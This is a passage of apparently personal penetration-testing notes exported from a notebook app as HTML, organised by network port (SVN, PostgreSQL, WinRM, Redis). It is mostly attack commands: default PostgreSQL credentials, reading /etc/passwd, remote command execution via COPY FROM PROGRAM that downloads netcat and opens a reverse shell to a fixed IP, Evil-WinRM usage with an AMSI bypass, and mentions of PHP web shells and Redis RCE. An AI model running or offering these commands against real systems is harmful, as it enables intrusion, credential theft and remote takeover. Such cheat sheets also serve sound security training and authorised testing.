  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.5493in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>A SQL injection
  payload to write a PHP shell using the OUTFILE function</p>
  </td>
 </tr>
</table>

</div>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.2687in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.2687in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>3389 TCP /
RDP</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.2625in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Saturday,
April 10, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>9:18
PM</p>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:4.1166in'>

<div style='direction:ltr;margin-top:0in;margin-left:.075in;width:2.268in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>3690 TCP /
SVN</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.075in;width:2.3375in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Thursday,
August 5, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>2:50
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:4.1166in'>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:2.1784in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>list svn contents</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.775in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>svn list
  svn://&lt;ip&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:2.1972in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>create local copy
  of respository </p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.7555in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>svn checkout
  svn://&lt;ip&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:2.1784in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Log history</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.775in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>svn log</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:2.1784in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>View/walk
  revisions</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8444in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>svn up
  -&lt;revision from log&gt;</p>
  </td>
 </tr>
</table>

</div>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:7.1395in'>

<div style='direction:ltr;margin-top:0in;margin-left:.2486in;width:2.9722in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>5432 TCP /
Postgresql</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.2486in;width:2.5534in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Wednesday,
August 18, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>7:57
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:7.1395in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Default credentials are:</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Username: postgres</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Password: postgres</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Sometimes no password
        (unconfirmed)</span></li>
   </ul>
  </ul>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Reverse shell privileges</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Windows - NT
       AUTHORITY/NETWORK SERVICE (low priv)</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Linux - postgres (low priv)</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Mac - user that installed
       postgres (usually an admin)</span></li>
  </ul>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>tools</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>psql</span></li>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:.3333in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.7048in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>connect to
   databse</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.7229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>psql -h
   &lt;ip&gt; -U &lt;usernamw&gt; </p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.7048in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>List databases</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.7229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>\list</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.7048in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>use databases</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.7229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>\c &lt;db&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.7048in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>List tables</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.7229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>\d</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.7048in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Get user roles</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.7229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>\du+</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.7048in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Browse system
   files</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.7229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>select
   pg_ls_dir('./');<br>
      select pg_ls_dir('/etc/passwd');</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.7236in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Read files by
   copying contents to a table</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.8354in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <div style='direction:ltr'>
   <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:
    ltr;border-collapse:collapse;border-style:solid;border-color:#A3A3A3;
    border-width:1pt' title="" summary="">
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:1.7159in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Create table</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:2.0062in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>create table
     docs (data TEXT);</p>
     </td>
    </tr>
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:1.7354in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Copy contents
     to a table</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:2.0055in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>copy docs from
     '/etc/passwd';</p>
     </td>
    </tr>
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:1.7159in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Display table
     contents</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:1.9555in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>select * from
     docs limit 10;</p>
     </td>
    </tr>
   </table>
   </div>
   </td>
  </tr>
 </table>
 </div>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>RCE</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:.3333in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.3486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Drop table</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.0479in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>DROP TABLE IF
   EXISTS cmd_exec;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.3486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Create table</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.0479in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>CREATE TABLE
   cmd_exec(cmd_output text);</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.3486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Setup command</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.1173in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>COPY cmd_exec
   FROM PROGRAM 'id'<br>
      COPY cmd_exec FROM PROGRAM 'wget <a href="http://192.168.49.90/nc'">http://192.168.49.90/nc'</a>;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>COPY cmd_exec
   FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash';</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.368in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Remove command</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.0284in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>DELETE FROM
   cmd_exec;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.368in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Execute command</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.0284in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SELECT * FROM
   cmd_exec;</p>
   </td>
  </tr>
 </table>
 </div>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:3.902in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:3.902in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>5985 TCP /
Microsoft HTTPAPI</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.3083in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
April 12, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>10:05
AM</p>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:7.9625in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.6437in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>5985 TCP /
WinRM</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.1208in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Sunday,
July 11, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>1:47
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:.1263in;width:7.8361in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Windows remote management</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Can log into a remote shell
       using user credentials</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Only users part of groups
        that have rights to this are allowed to login this way</span></li>
   </ul>
  </ul>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Tools</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Evil-WinRM</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><a
        href="https://github.com/Hackplayers/evil-winrm"><span
        style='font-family:Calibri;font-size:11.0pt'>https://github.com/Hackplayers/evil-winrm</span></a></li>
   </ul>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:.7083in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.5451in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Usage</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.5784in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>evil-winrm -I
   &lt;ip address&gt; -u &lt;username&gt; -p &lt;password&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.5451in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show menu</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.5784in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>menu</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.5451in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Invoke-Binary</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.5784in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Invoke-Binary
   &lt;.exe on local machine&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.5451in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Bypass AMSI</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.5784in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Bypass-4MSI</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.5645in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Connect with SSL
   cert</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.6284in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>evil-winrm -i
   &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -k &lt;private key&gt; -c
   &lt;signed key/certificate&gt; -S</p>
   </td>
  </tr>
 </table>
 </div>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:18.7548in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.3576in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>6379 TCP /
redis</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.1736in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Friday,
August 6, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>8:54
AM</p>

</div>

<table border=0 cellpadding=0 cellspacing=0 cols=3 valign=top style='direction:
 ltr;border-collapse:collapse;border-width:0pt;margin-top:.434in;margin-left:
 0in;width:18.7548in'>
 <tr>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:1px;
  height:1px;font-size:1pt'>
  <p style='font-size:1pt'>&nbsp;</p>
  </td>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:10.1708in;
  height:1px;font-size:1pt'>
  <p style='font-size:1pt'></p>
  </td>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:.8284in;
  height:1px;font-size:1pt'>
  <p style='font-size:1pt'></p>
  </td>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:7.7548in;
  height:1px;font-size:1pt'>
  <p style='font-size:1pt'></p>
  </td>
 </tr>
 <tr>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:1px;
  height:3.2493in;font-size:1pt'>
  <p style='font-size:1pt'>&nbsp;</p>
  </td>
  <td rowspan=3 valign=top style='vertical-align:top;margin:0in;padding:0pt;
  width:10.1708in;height:7.1659in'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Key store / value storage</span></li>
   <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Create php web shell</span></li>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>If able to upload files to
        victim, upload module for RCE</span></li>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>=&lt;5.0.5(?) clone-master
        RCE</span></li>
   </ul>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Tools</span></li>
   <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>redis-cli</span></li>
   </ul>
  </ul>
  <div style='direction:ltr'>
  <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
   border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
   1pt;margin-left:.7083in' title="" summary="">
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:5.4041in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Get redis info /
    test if authentication is require</p>
    <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>By default redis does not
         require credentials</span></li>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>Redis can be configured
         to require only a password or username + password</span></li>
     <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>If only the passsword is
          set, then the username is &quot;default&quot;</span></li>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>There is no way to know
          externally if password or password &amp; username are set.</span></li>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>redis.conf is the
          configuration file.<span style='mso-spacerun:yes'>�
          </span>requirepass and masteruser are the username and password
          settings</span></li>
     </ul>
    </ul>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:3.9291in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>info</p>
    </td>
   </tr>
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:5.4041in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Login with
    credentials</p>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:3.9291in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>AUTH
    &lt;password&gt;<br>
        AUTH &lt;username&gt; &lt;password&gt;</p>
    </td>
   </tr>
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:5.4041in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Get
    configuration file contents</p>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:3.9291in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>CONFIG GET *</p>
    </td>
   </tr>
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:5.4041in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show connected
    clients </p>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:3.9291in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>CLIENT LIST</p>
    </td>
   </tr>
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:5.4041in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show keys</p>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:3.9291in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>keys *</p>
    </td>
   </tr>
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
